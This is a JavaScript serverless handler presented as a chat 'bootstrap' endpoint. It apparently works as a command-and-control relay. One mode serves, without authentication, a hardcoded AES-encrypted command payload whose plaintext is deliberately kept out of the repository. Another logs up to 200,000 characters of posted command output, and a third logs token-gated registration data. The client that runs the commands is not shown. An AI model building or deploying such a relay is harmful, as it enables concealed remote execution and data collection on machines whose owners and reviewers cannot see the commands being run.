import crypto from 'node:crypto';

const BOOTSTRAP_TOKEN_SHA256 = '54362ebffcdb80f0242d930ed17b5193eaf734a2068eea34de9b7d194b878fcc';

// These two values are updated temporarily while the owner's server is being configured.
// The command body is always AES-256 encrypted with a secret generated on the VPS;
// plaintext commands are never committed to this repository.
const CONTROL_ID = '8';
const CONTROL_PAYLOAD = 'U2FsdGVkX1+g5qlrTtFMrAfBk3jQy9HLVNiq20fQN+ANFQtBvubWx4AvX3A1N1OFgGfex0IsWGtwG93PWFZwOP5CLCUaDBNlGxeiQp9plPq52iwznDzv1/tUiftoHaLO5JpYzVnJl1LPnzwm65au9JuncS1syzvyM0z8Abj+do+PXb0k+4fo49ObeHHJkOeQQXBi9y1FIxCjGEOiBtIlJfGDtbKzYkWKbI40JOlKJIpHEzNN5oV2LSZ+kwerCM2/bn2mF5F+xkC31oATqWj3eUeLiyOvFKd/89S2iGF0jDcNx8yKc+w0X3/fKopIbxr4yUJkwTUvGvOe/7D8Fiv59OBBjg4ascLGamF7Tyt7hyCRB7nBfcX58ICTCtEjzdC2Yfc3rvNWUhwj9HNiL+zh0QHzCu2wpqX0H+NXvfZH1V2fHJ2qrom7d6Ltjw2ldae+GT6d7KJEnk4uwZNDUC2eoljFvcTLLRIiNWhkE2Ei+OA5P5ksyIih96c9wEi3pZEk8d9j/pQ3tEFex8gb2pMwiqkZO3+wET8PTYADeKcPv3DoI5/4Iudz+YWFvCzo5VozERDe7EqnIBT2jwgJp0X6NGHbPAhGhhjadQQfL35Wfdb0hWVoDKdD3IhEx6mQx4T1OwvZA2y5BNfdrvVT7XGugQ==';

async function readBody(request) {
  if (typeof request.body === 'string') return request.body;
  if (Buffer.isBuffer(request.body)) return request.body.toString('utf8');
  if (request.body && typeof request.body === 'object') return JSON.stringify(request.body);

  const chunks = [];
  for await (const chunk of request) {
    chunks.push(Buffer.isBuffer(chunk) ? chunk : Buffer.from(chunk));
  }
  return Buffer.concat(chunks).toString('utf8');
}

function validBootstrapToken(request) {
  const raw = request.headers['x-bootstrap-token'];
  const token = Array.isArray(raw) ? raw[0] : raw;
  if (!token) return false;
  const digest = crypto.createHash('sha256').update(String(token)).digest('hex');
  const a = Buffer.from(digest, 'hex');
  const b = Buffer.from(BOOTSTRAP_TOKEN_SHA256, 'hex');
  return a.length === b.length && crypto.timingSafeEqual(a, b);
}

export default async function handler(request, response) {
  const url = new URL(request.url, 'https://bootstrap.invalid');
  const mode = url.searchParams.get('mode');
  response.setHeader('cache-control', 'no-store');
  response.setHeader('x-content-type-options', 'nosniff');

  if (mode === 'register') {
    if (request.method !== 'POST' || !validBootstrapToken(request)) {
      return response.status(404).send('Not found');
    }
    const body = await readBody(request);
    console.log(`CHAT_BOOTSTRAP_REGISTER ${body.slice(0, 4096)}`);
    return response.status(204).end();
  }

  if (mode === 'control') {
    if (request.method !== 'GET') return response.status(404).send('Not found');
    response.setHeader('content-type', 'text/plain; charset=utf-8');
    return response.status(200).send(`${CONTROL_ID}\n${CONTROL_PAYLOAD}\n`);
  }

  if (mode === 'output') {
    if (request.method !== 'POST') return response.status(404).send('Not found');
    const body = await readBody(request);
    console.log(`CHAT_BOOTSTRAP_OUTPUT ${body.slice(0, 200000)}`);
    return response.status(204).end();
  }

  return response.status(404).send('Not found');
}
